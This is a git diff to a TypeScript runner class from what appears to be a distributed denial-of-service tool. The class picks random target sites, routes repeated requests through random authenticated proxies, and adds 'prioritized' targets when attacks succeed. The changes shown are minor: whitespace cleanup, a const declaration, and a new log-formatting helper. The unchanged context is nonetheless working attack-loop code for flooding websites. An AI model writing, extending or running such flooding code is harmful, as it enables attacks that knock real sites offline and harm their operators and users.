@@ -2,6 +2,7 @@ import { EventEmitter } from 'events'
 import axios, { AxiosError } from 'axios-https-proxy-fix'
 import { ProxyData, SiteData, PrioritizedTarget } from './types'
 import { HttpHeadersUtils } from './utils/httpHeadersUtils'
+import { formatLog } from './utils/format'
 import { Doser } from './doser'
 import { AxiosProxyConfig } from 'axios'
 
@@ -43,16 +44,16 @@ export class Runner {
           }
         }
         let priorityTargetsToAdd = await this.sendTroops(pTarget)
-        if(priorityTargetsToAdd && this.canAddPrioritized){ 
+        if(priorityTargetsToAdd && this.canAddPrioritized){
           if(priorityTargetsToAdd[0] && priorityTargetsToAdd[1]) {
             let howMuch = priorityTargetsToAdd[0]
             let targetData = priorityTargetsToAdd[1] as PrioritizedTarget
             for (let index = 0; index < howMuch; index++) {
               if(this.canAddPrioritized) {
-                this.doserInstance.addPrioritizedTarget(targetData.page, targetData.proxyObj)      
+                this.doserInstance.addPrioritizedTarget(targetData.page, targetData.proxyObj)
 
-              }       
-              
+              }
+
             }
           }
         }
@@ -118,8 +119,8 @@ export class Runner {
         const r = await this.requestMe(target, this.requestTimeout, proxy)
         if(r[0] != -1 && r[0] != undefined && r[0] >= 200) {
           okReq = okReq + 1
-        } 
-        this.eventSource.emit('attack', { url: target.page, log: `${target.page} | ${proxy ? "PROXY" : "DIRECT"}PRIORITIZED | ${r[0] == -1 ? "" : r[0]} ${r[1]  ? r[1] : r[0] == -1 ? "Undefined error" : "OK"}` }) 
+        }
+        this.eventSource.emit('attack', { url: target.page, log: `${target.page} | ${proxy ? "PROXY" : "DIRECT"}PRIORITIZED | ${r[0] == -1 ? "" : r[0]} ${r[1]  ? r[1] : r[0] == -1 ? "Undefined error" : "OK"}` })
       }
       if(okReq >= (this.ATTACKS_PER_PRIORITIZED_TARGET / 16)) {
         let toAdd = 1
@@ -137,9 +138,9 @@ export class Runner {
       return
     }
     const target = this.doserInstance.sites[Math.floor(Math.random() * this.doserInstance.sites.length)]
-    
-    
-    
+
+
+
     let directRequest = false
     if (!this.onlyProxy) {
       let probe = await this.requestMe(target, this.requestTimeout, undefined)
@@ -159,7 +160,7 @@ export class Runner {
       if (!this.active) {
         break
       }
-      
+
       try {
         if (directRequest) {
           // PROBABLY NOT REACHED ANYMORE
@@ -174,7 +175,7 @@ export class Runner {
           }
         } else {
           proxy = this.doserInstance.proxies[Math.floor(Math.random() * this.doserInstance.proxies.length)]
-          let proxyObj: any = {}
+          const proxyObj: any = {}
           const proxyAddressSplit = proxy.ip.split(':')
           const proxyIP = proxyAddressSplit[0]
           const proxyPort = parseInt(proxyAddressSplit[1])
@@ -186,7 +187,6 @@ export class Runner {
             const proxyUsername = proxyAuthSplit[0]
             const proxyPassword = proxyAuthSplit[1]
             proxyObj.auth = { username: proxyUsername, password: proxyPassword }
-
           }
 
           const r = await this.requestMe(target, this.requestTimeout, proxyObj)
@@ -208,7 +208,7 @@ export class Runner {
           console.error(e)
         }
 
-        this.eventSource.emit('attack', { type: 'atack', url: target.page, log: `${target.page} | ${code}` })
+        this.eventSource.emit('attack', { type: 'atack', url: target.page, log: formatLog(target.page, code) })
         if (code === 'ECONNABORTED') {
           break
         }
